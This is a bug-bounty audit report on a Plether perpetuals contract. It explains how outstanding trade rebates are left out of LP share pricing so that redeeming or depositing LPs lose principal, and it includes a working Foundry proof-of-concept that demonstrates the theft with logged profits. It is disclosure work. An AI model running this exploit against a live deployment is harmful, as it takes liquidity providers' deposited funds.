# \#99830 [SC-Critical] A trader holding Junior shares opens a rebated trade before an LP epoch, and the LPs who redeem in that epoch are paid as if the rebate never comes back

**Submitted on Nov 15th 2026 at 12:38:06 UTC by @Audittens for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99830
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

LP shares are priced from what the pool owns, so redeeming or depositing at that price should not move value between LPs. A trade that reduces the gap between longs and shorts earns a rebate (a negative VPI, the price-impact charge, in the code), and the pool pays it out of LP cash at once. The trader cannot keep it: the same amount is locked in the trader's account and comes back to the pool when the position closes. The price of LP shares counts the rebate as paid out but not the amount owed back, so every LP who redeems while it is outstanding is underpaid, and the LPs who stay collect the difference when it returns. A trader who also holds Junior shares can open the rebate just before an epoch that funds a large redemption and keep the redeemer's loss.

## Vulnerability Details

When an open reduces the gap, `CfdEngineSettlementSidecar.executeOpen` [pays the rebate](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol#L442-L444) to the clearinghouse through `HousePool.payOut`, which lowers the pool's assets by the full amount. In the same call it [locks the reserve](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol#L466-L478), an equal amount the trader cannot withdraw.

The rebate is only a loan from the pool. When the position closes, `CloseAccountingLib` [clamps the close](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CloseAccountingLib.sol#L112-L118) so that the position's lifetime VPI never ends below zero, which means the close charges back at least the rebate, whatever the gap is by then. The planner [takes that clawback](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CfdEnginePlanLib.sol#L1052-L1057) from the reserve, and `executeClose` books it as [revenue](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol#L604-L613) of the pool. Liquidation takes the same clawback.

Between the open and the close, the reserve is missing from the price of LP shares. `getHousePoolInputSnapshot` [builds that price](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineProtocolLens.sol#L62-L73) from the pool's assets, the traders' price PnL and trader claims, and has no field for the reserve:

[packages/perps/src/CfdEngineProtocolLens.sol:62-73](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineProtocolLens.sol#L62-L73)
```solidity
ICfdEngineTypes.TerminalNavSnapshot memory terminalSnapshot = engineContract.terminalNavSnapshot();
uint256 poolAssets = engineContract.pool().totalAssets();
snapshot.physicalAssets = poolAssets;
snapshot.netPhysicalAssets = poolAssets;
snapshot.maxLiabilityAssets = terminalSnapshot.maxDirectionalLiabilityAssets;
snapshot.supplementalReservedAssets = SolvencyAccountingLib.settlementBufferTargetAssets(
    snapshot.maxLiabilityAssets, engineContract.settlementBufferBps()
);
snapshot.terminalLpPriceDeltaAssets = terminalSnapshot.terminalLpPriceDeltaAssets;
snapshot.terminalNavBookVersion = terminalSnapshot.bookVersion;
snapshot.traderClaimBalanceAssets = terminalSnapshot.totalTraderClaimsAssets;
snapshot.hasOpenPositions = terminalSnapshot.hasOpenPositions;
```

So the rebate lowers LP value at the open, and the reserve that repays it raises LP value only at the close. A redemption funded in between is paid from the lowered value and never receives its part of the repayment. That part is split among the shares that still exist at the close.

The specification [states the exclusion](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/ACCOUNTING_SPEC.md#L1064-L1066) on purpose, as "anticipated" VPI that must not inflate LP value. The whitepaper also calls a similar timing effect for carry an [intentional policy](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/WHITEPAPER.md#L966-L977). Neither applies here. Carry is new revenue that LPs have not earned yet, while the reserve repays LP cash that has already left the pool and is certain to come back. Counting the payment out but not the repayment does not keep LP value conservative. It moves principal from the LPs who leave to the LPs who stay.

The whitepaper gives the reason for the exclusion: the reserve is left out ["so LPs cannot withdraw it as marked equity"](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/WHITEPAPER.md#L887-L888) before the position settles. That goal does not need the reserve to be missing from the price. The protocol already separates the two: SECURITY.md says marked receivables ["affect ownership pricing but remain unavailable to fund redemptions until physically collected"](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L862). Counting the reserve in the price the same way would not let anyone withdraw it early.

### Attack scenario

The setup uses the release risk parameters from `DEPLOYMENT.md`. Senior holds 30,000,000 USDG and the attacker holds 10,000,000 USDG of Junior. An organic 16,000,000 USDG long is alone in the book and has no VPI of its own (it opened across an 8,000,000 USDG short that has since closed), so the pool's value before the attack contains no VPI that could later be refunded. Bob, an honest LP, then deposits 20,000,000 USDG into Junior.

1. Bob calls `TrancheVault.requestRedeem` for all his Junior shares. The request is public, and the next LP epoch funds it.
2. Before that epoch, the attacker calls `OrderRouter.commitOrder` for a 16,000,000 USDG short, and a keeper executes it through `OrderRouter.executeOrder`. The short reduces the gap, so `executeOpen` pays a 21,321 USDG rebate out of the pool and locks the same amount in the attacker's reserve.
3. Anyone calls `OrderRouter.settleLpEpoch` after the epoch boundary. Bob's shares are priced without the reserve, so Junior is valued 21,321 USDG too low, and Bob, who holds two thirds of Junior, is paid 19,985,436 USDG.
4. The attacker closes the short. The close charges back the rebate, the reserve returns to the pool, and the Junior shares that remain, almost all the attacker's, collect it.
5. Without step 2, Bob would be paid 19,999,635 USDG: his deposit less 365 USDG, his part of the coupon Junior pays to Senior over the two hours. The attack takes 14,198 USDG of his deposit, two thirds of the rebate, although the price never moved. The attacker ends 1,395 USDG ahead of doing nothing, after 12,800 USDG of execution fees.

## Impact Details

Direct theft of user funds in motion. While a trader's rebate is outstanding, redeeming LPs are paid less than their share of the pool and the LPs who stay get the difference. In the test, an LP who deposited 20,000,000 USDG into Junior and redeems it is paid 14,198 USDG less than without the attack, and the attacker nets 1,395 USDG.

The redeeming LP loses part of the USDG they deposited, not yield: the rebate left the pool out of the assets that back every LP share, and the reserve only repays it. Each LP who redeems while a rebate `R` is outstanding loses `r * R`, where r is their share of the tranche that absorbs the rebate, Junior first. The LPs who stay gain the same amount when the reserve returns. In the test Bob deposits after the pool's earlier revenue is already in the share price and earns nothing afterwards, so the whole 14,198 USDG comes out of his deposit.

The same gap works for deposits in the other direction. A Junior deposit that activates while a rebate is outstanding buys shares at the lowered price and collects part of the repayment from the LPs already in the pool. In the second test the attacker holds no Junior shares: it requests a 20,000,000 USDG Junior deposit, opens the 16,000,000 USDG short before the epoch that activates the deposit, and closes it after activation. The shares of Bob, who holds the existing Junior, end up worth 21,300 USDG less than without the attack, and the attacker nets 8,502 USDG after 12,800 USDG of fees.

The loss does not need an attacker. Any open that reduces the gap underpays every redemption funded before that position closes. An attacker makes it larger and aims it:
- The rebate grows with the square of the gap it closes, so it is largest when organic skew sits near the 40% cap: about 32,000 USDG for a 16,000,000 USDG gap on 40,000,000 USDG of depth.
- The attacker needs a queued redemption, which is public, or a deposit large enough to own about 40% of Junior.
- The attacker profits when their share of the redeemer's loss exceeds two execution fees of 4 bps of notional each. Price risk lasts only from the open to the close.
- Every step uses permissionless entry points: `commitOrder`, `executeOrder` and `settleLpEpoch`, plus `requestRedeem` or `requestDeposit` on the attacker's own shares.

## Recommended Mitigation

Count each outstanding reserve as an amount owed to the pool in `getHousePoolInputSnapshot`, so that LP value falls only by the part of a rebate that will not come back. A redemption or deposit made while a rebate is outstanding then pays or buys at the value the pool will have when the reserve returns, and neither can move the repayment between LPs.

## References

- [CfdEngineSettlementSidecar.sol:442-444](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol#L442-L444)
- [CfdEngineSettlementSidecar.sol:466-478](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol#L466-L478)
- [CloseAccountingLib.sol:112-118](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CloseAccountingLib.sol#L112-L118)
- [CfdEngineSettlementSidecar.sol:604-613](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol#L604-L613)
- [CfdEngineProtocolLens.sol:62-73](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineProtocolLens.sol#L62-L73)

## Proof of Concept

The tests use the release risk parameters from `DEPLOYMENT.md`. Orders go through `OrderRouter.commitOrder` and `OrderRouter.executeOrder`, and epochs are settled through the permissionless `OrderRouter.settleLpEpoch`. Each test saves the state and plays the same epoch out once without the attack, so the result can be compared with what Bob and the attacker have if the attacker does not trade.

Paste the code into `test/POC.t.sol` at the repository root and run:

```bash
forge test --match-path test/POC.t.sol -vv
```

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../packages/perps/test/perps/BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {console} from "forge-std/console.sol";

contract Test is BasePerpTest {

    address internal bob = makeAddr("bob"); // honest Junior LP
    address internal attacker = makeAddr("attacker"); // Junior LP and trader
    address internal seniorLp = makeAddr("seniorLp"); // honest Senior LP
    address internal organicTrader = makeAddr("organicTrader"); // holds the organic long
    address internal otherTrader = makeAddr("otherTrader"); // opens and closes a short during the setup
    address internal keeper = makeAddr("keeper");

    uint256 internal constant DEPOSIT = 20_000_000e6;
    uint256 internal constant TRADER_FUNDS = 500_000e6;

    /// @dev Release risk parameters from DEPLOYMENT.md.
    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    /// @dev The attacker holds Junior shares and takes the principal of an LP who redeems.
    function test_redeemerLosesPrincipalWhileRebateOutstanding() public {
        // Setup: the attacker holds 10M of Junior, and Bob deposits 20M after the organic long is in place.
        _setUpPool(attacker);
        uint256 bobShares = _depositJunior(bob, false);

        // Step 1: after the deposit cooldown, Bob requests to redeem all his Junior shares.
        vm.warp(juniorVault.lastDepositTime(bob) + juniorVault.DEPOSIT_COOLDOWN());
        vm.prank(bob);
        uint256 bobRequest = juniorVault.requestRedeem(bobShares, bob, bob);
        uint256 epoch = juniorVault.depositEpochStart(bobRequest);

        // For comparison: the same epoch if the attacker does nothing.
        uint256 snapshot = vm.snapshotState();
        vm.warp(epoch);
        router.settleLpEpoch(_mockPythUpdateData(1e8));
        uint256 bobPaidWithoutAttack = _claimRedeem(bob, bobRequest);
        uint256 attackerWithoutAttack = _juniorValue(attacker);
        vm.revertToState(snapshot);

        // Step 2: before the epoch, the attacker opens a 16M short. It closes the gap, so the pool pays a rebate
        // out of its cash and locks the same amount in the attacker's reserve.
        _fundTrader(attacker, TRADER_FUNDS);
        uint256 poolBeforeOpen = pool.totalAssets();
        _trade(attacker, CfdTypes.Side.SHORT, 16_000_000e18, 200_000e6, false);
        uint256 rebate = poolBeforeOpen - pool.totalAssets();

        // Step 3: anyone settles the epoch. Bob's shares are priced without the reserve.
        vm.warp(epoch);
        router.settleLpEpoch(_mockPythUpdateData(1e8));
        uint256 bobPaid = _claimRedeem(bob, bobRequest);

        // Step 4: the attacker closes the short; the rebate is charged back and goes to the Junior shares left.
        _trade(attacker, CfdTypes.Side.SHORT, 16_000_000e18, 0, true);
        uint256 attackerWithAttack = _juniorValue(attacker) + clearinghouse.balanceAssets(attacker) - TRADER_FUNDS;

        console.log("rebate paid from the pool (USDG):    ", rebate / 1e6);
        console.log("Bob deposited (USDG):                ", DEPOSIT / 1e6);
        console.log("Bob paid, no attack (USDG):          ", bobPaidWithoutAttack / 1e6);
        console.log("Bob paid, with the attack (USDG):    ", bobPaid / 1e6);
        console.log("Bob's loss from the attack (USDG):   ", (bobPaidWithoutAttack - bobPaid) / 1e6);
        console.log("attacker, no attack (USDG):          ", attackerWithoutAttack / 1e6);
        console.log("attacker, with the attack (USDG):    ", attackerWithAttack / 1e6);
        console.log("attacker's profit (USDG):            ", (attackerWithAttack - attackerWithoutAttack) / 1e6);

        // Without the attack Bob gets his deposit back less 365 USDG, Junior's part of the Senior coupon for the
        // two hours. With the attack he gets about 14,200 USDG less than that.
        assertGe(bobPaidWithoutAttack, DEPOSIT - 400e6, "without the attack Bob gets his deposit back");
        assertLt(bobPaid, bobPaidWithoutAttack - 14_000e6, "the attack takes Bob's principal");
        assertGt(attackerWithAttack, attackerWithoutAttack + 1000e6, "attacker profits");
    }

    /// @dev The attacker holds no Junior shares and deposits while its own rebate is outstanding.
    function test_depositorTakesValueFromExistingLpWhileRebateOutstanding() public {
        // Setup: Bob holds 10M of Junior.
        _setUpPool(bob);

        // For comparison: the attacker only deposits 20M into Junior.
        uint256 snapshot = vm.snapshotState();
        _depositJunior(attacker, false);
        uint256 bobWithoutAttack = _juniorValue(bob);
        uint256 attackerWithoutAttack = _juniorValue(attacker);
        vm.revertToState(snapshot);

        // The attacker requests the same deposit, opens a 16M short before the epoch that activates it, and
        // closes the short right after.
        _fundTrader(attacker, TRADER_FUNDS);
        _depositJunior(attacker, true);
        _trade(attacker, CfdTypes.Side.SHORT, 16_000_000e18, 0, true);
        uint256 attackerWithAttack = _juniorValue(attacker) + clearinghouse.balanceAssets(attacker) - TRADER_FUNDS;

        console.log("Bob's shares, no attack (USDG):      ", bobWithoutAttack / 1e6);
        console.log("Bob's shares, with the attack (USDG):", _juniorValue(bob) / 1e6);
        console.log("Bob's loss from the attack (USDG):   ", (bobWithoutAttack - _juniorValue(bob)) / 1e6);
        console.log("attacker, no attack (USDG):          ", attackerWithoutAttack / 1e6);
        console.log("attacker, with the attack (USDG):    ", attackerWithAttack / 1e6);
        console.log("attacker's profit (USDG):            ", (attackerWithAttack - attackerWithoutAttack) / 1e6);

        assertLt(_juniorValue(bob), bobWithoutAttack - 20_000e6, "the attack takes value from Bob's shares");
        assertGt(attackerWithAttack, attackerWithoutAttack + 5000e6, "attacker profits");
    }

    /// @dev `juniorLp` holds 10M of Junior and the Senior LP holds 30M of Senior (release Senior limits). An organic
    ///      16M long is left alone in the book with no VPI of its own: it opens across an 8M short (the gap is 8M
    ///      before and after), and the short then closes.
    function _setUpPool(
        address juniorLp
    ) internal {
        _setSeniorCapacity(40_000_000e6, 8000);
        _fundJunior(juniorLp, 10_000_000e6);
        _fundSenior(seniorLp, 30_000_000e6);
        _fundTrader(otherTrader, TRADER_FUNDS);
        _fundTrader(organicTrader, 2_000_000e6);
        _trade(otherTrader, CfdTypes.Side.SHORT, 8_000_000e18, 400_000e6, false);
        _trade(organicTrader, CfdTypes.Side.LONG, 16_000_000e18, 1_000_000e6, false);
        _trade(otherTrader, CfdTypes.Side.SHORT, 8_000_000e18, 0, true);
        (,,,,,, int256 organicVpi) = engine.positions(organicTrader);
        assertEq(organicVpi, 0, "the organic long has no VPI to refund");
    }

    /// @dev `lp` deposits 20M into Junior through `requestDeposit`, `OrderRouter.settleLpEpoch` and `claimDeposit`.
    ///      With `openShort`, `lp` opens a 16M short between the request and the epoch.
    function _depositJunior(
        address lp,
        bool openShort
    ) internal returns (uint256 shares) {
        settlementToken.mint(lp, DEPOSIT);
        vm.startPrank(lp);
        settlementToken.approve(address(juniorVault), DEPOSIT);
        uint256 requestId = juniorVault.requestDeposit(DEPOSIT, lp, lp);
        vm.stopPrank();
        if (openShort) {
            _trade(lp, CfdTypes.Side.SHORT, 16_000_000e18, 200_000e6, false);
        }
        vm.warp(juniorVault.depositEpochStart(requestId));
        router.settleLpEpoch(_mockPythUpdateData(1e8));
        vm.prank(lp);
        shares = juniorVault.claimDeposit(requestId, DEPOSIT, lp, lp);
    }

    function _juniorValue(
        address lp
    ) internal view returns (uint256) {
        return juniorVault.convertToAssets(juniorVault.balanceOf(lp));
    }

    function _claimRedeem(
        address lp,
        uint256 requestId
    ) internal returns (uint256) {
        uint256 claimable = juniorVault.claimableRedeemRequest(requestId, lp);
        vm.prank(lp);
        return juniorVault.claimRedeem(requestId, claimable, lp, lp);
    }

    /// @dev The trader commits an order through `OrderRouter.commitOrder` and the keeper executes it at 1.00.
    function _trade(
        address trader,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool isClose
    ) internal {
        uint256 window = router.maxExecutionWindowSeconds();
        OrderV3Types.OrderRequest memory request = OrderV3Types.OrderRequest({
            clientOrderId: keccak256(abi.encode(trader, isClose)),
            side: side,
            sizeDelta: size,
            marginDelta: margin,
            targetPrice: (side == CfdTypes.Side.LONG) == isClose ? type(uint256).max : 1,
            isClose: isClose,
            bounds: OrderV3Types.ExecutionBounds({
                submitBy: uint64(vm.getBlockTimestamp() + window),
                executionWindowSeconds: uint32(window),
                allowedExecutionModes: 7,
                expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
                maxExecutionBountyAssets: type(uint256).max,
                maxExecutionNotionalAssets: type(uint256).max,
                maxGrossAccountDebitAssets: type(uint256).max,
                maxActionChargeAssets: type(uint256).max,
                maxExplicitFeesAssets: type(uint256).max,
                maxPostPositionSize: type(uint256).max,
                minPostSettlementBalanceAssets: 0,
                minPostPositionEquityAssets: 0,
                maxPostLeverageBps: type(uint32).max
            })
        });
        vm.prank(trader);
        uint64 orderId = router.commitOrder(request);
        bytes[] memory priceData = _mockPythUpdateData(1e8);
        vm.prank(keeper);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(orderId, priceData);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "order executes");
    }

}
```

Output:

```
Ran 2 tests for test/POC.t.sol:Test
[PASS] test_depositorTakesValueFromExistingLpWhileRebateOutstanding() (gas: 14252990)
Logs:
  Bob's shares, no attack (USDG):       10031716
  Bob's shares, with the attack (USDG): 10010415
  Bob's loss from the attack (USDG):    21300
  attacker, no attack (USDG):           19999999
  attacker, with the attack (USDG):     20008502
  attacker's profit (USDG):             8502
[PASS] test_redeemerLosesPrincipalWhileRebateOutstanding() (gas: 13974881)
Logs:
  rebate paid from the pool (USDG):     21321
  Bob deposited (USDG):                 20000000
  Bob paid, no attack (USDG):           19999635
  Bob paid, with the attack (USDG):     19985436
  Bob's loss from the attack (USDG):    14198
  attacker, no attack (USDG):           10031533
  attacker, with the attack (USDG):     10032929
  attacker's profit (USDG):             1395

Suite result: ok. 2 passed; 0 failed; 0 skipped
```
